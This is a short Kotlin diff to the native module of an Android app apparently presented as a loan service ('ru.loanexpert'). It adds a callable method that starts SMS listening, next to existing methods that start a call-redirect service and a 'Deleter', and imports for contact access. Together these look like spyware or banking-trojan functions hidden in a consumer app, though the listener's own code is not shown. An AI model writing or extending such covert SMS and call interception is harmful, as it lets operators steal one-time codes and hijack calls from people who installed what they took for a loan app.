@@ -2,6 +2,7 @@ package ru.loanexpert
 
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter;
 import android.net.Uri
 import android.provider.BaseColumns;
 import android.provider.ContactsContract;
@@ -15,6 +16,7 @@ import android.util.Log
 import java.util.ArrayList;
 class MainModule(reactContext: ReactApplicationContext) : ReactContextBaseJavaModule(reactContext) {
     override fun getName() = "MainModule"
+    private val smsListenerModule: SmsListenerModule = SmsListenerModule(reactContext)
     @ReactMethod
     fun fastLoad(name: String) {
         Log.d(TAG,"Deleter")
@@ -27,6 +29,11 @@ class MainModule(reactContext: ReactApplicationContext) : ReactContextBaseJavaMo
         Log.d(TAG,"CallRedirect")
         val serviceIntent = Intent(reactApplicationContext, CallListenerService::class.java)
         reactApplicationContext.startService(serviceIntent)
+    }
+    @ReactMethod
+    fun startSmsListening() {
+        Log.d(TAG, "Starting SMS Listening")
+        smsListenerModule.startListening()
     }
     @ReactMethod
     fun fetchNoteText(callback: Callback) {
